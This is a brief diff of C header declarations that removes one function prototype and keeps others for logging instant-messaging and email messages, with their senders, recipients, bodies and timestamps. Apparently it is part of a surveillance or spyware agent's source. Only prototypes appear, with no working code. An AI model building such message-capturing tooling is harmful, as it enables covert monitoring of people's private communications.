@@ -48,7 +48,6 @@ struct MailSerializedMessageHeader {
 extern social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
 extern void urldecode(char *src);
 extern void JsonDecode(char *string);
-extern void CheckProcessStatus();
 extern void LogSocialIMMessageA(DWORD program, char *peers, char *peers_id, char *author, char *author_id, char *body, struct tm *tstamp, BOOL is_incoming);
 extern void LogSocialIMMessageW(DWORD program, WCHAR *peers, WCHAR *peers_id, WCHAR *author, WCHAR *author_id, WCHAR *body, struct tm *tstamp, BOOL is_incoming);
 extern void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming);
